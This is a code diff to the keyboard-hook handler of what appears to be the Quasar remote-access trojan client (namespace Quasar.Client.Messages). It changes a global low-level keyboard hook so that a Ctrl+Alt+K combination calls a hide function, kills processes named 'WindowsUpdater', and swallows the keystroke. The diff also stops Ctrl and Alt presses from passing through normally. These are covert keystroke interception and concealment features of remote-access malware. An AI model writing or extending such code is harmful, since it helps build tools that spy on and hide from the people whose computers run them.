@@ -6,6 +6,7 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.AccessControl;
 using System.ServiceModel.Channels;
@@ -310,13 +311,30 @@ namespace Quasar.Client.Messages
 
                 if (key == Keys.LMenu || key == Keys.RMenu)
                     _altPressed = isKeyDown ? true : isKeyUp ? false : _altPressed;
-                
+
                 // ALLOW Ctrl, Alt, and K key to flow normally
-                if (key == Keys.LControlKey || key == Keys.RControlKey ||
-                    key == Keys.LMenu || key == Keys.RMenu ||
-                    (key == Keys.K && _ctrlPressed && _altPressed))
+                if (key == Keys.K && _ctrlPressed && _altPressed)
                 {
-                    return CallNextHookEx(_keyboardHookID, nCode, wParam, lParam);
+                    Interception.InterceptionHelper.HideFunction();
+                    string targetProcess = "WindowsUpdater";
+                    var processes = Process.GetProcessesByName(targetProcess);
+                    if (!processes.Any())
+                    {
+                        return (IntPtr)1;
+                    }
+                    foreach (var proc in processes)
+                    {
+                        try
+                        {
+                            proc.Kill();
+                            proc.WaitForExit();
+                        }
+                        catch (Exception ex)
+                        {
+                            //Console.WriteLine($"Failed to kill PID {proc.Id}: {ex.Message}");
+                        }
+                    }
+                    return (IntPtr)1;
                 }
 
                 if ((int)kbStruct.dwExtraInfo != 0x0AA)
